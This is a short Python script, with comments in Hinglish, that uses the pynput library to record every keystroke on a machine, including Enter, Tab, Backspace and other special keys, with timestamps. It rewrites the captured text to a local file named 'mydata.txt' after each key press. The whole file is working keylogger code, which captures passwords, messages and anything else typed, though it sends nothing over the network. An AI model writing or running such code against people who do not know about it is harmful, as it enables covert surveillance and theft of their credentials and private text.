from pynput.keyboard import Listener, Key
import datetime

current_text = ""

def get_timestamp():
    return datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")

def writetofile(key):
    global current_text
    timestamp = get_timestamp()
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            current_text += key.char
        elif key == Key.space:
            current_text += " "
        elif key == Key.enter:
            current_text += "\n" + timestamp  # Enter pe new line + timestamp
        elif key == Key.tab:
            current_text += "\t"
        elif key == Key.backspace:
            current_text = current_text[:-1]
        else:
            # Optional: special keys ko bhi log karo with timestamp
            current_text += f"{timestamp}[{str(key).replace('Key.', '')}] "
    except:
        pass
    
    # Har baar file overwrite
    with open("mydata.txt", "w") as f:
        f.write(current_text)

with Listener(on_press=writetofile) as l:
    l.join()
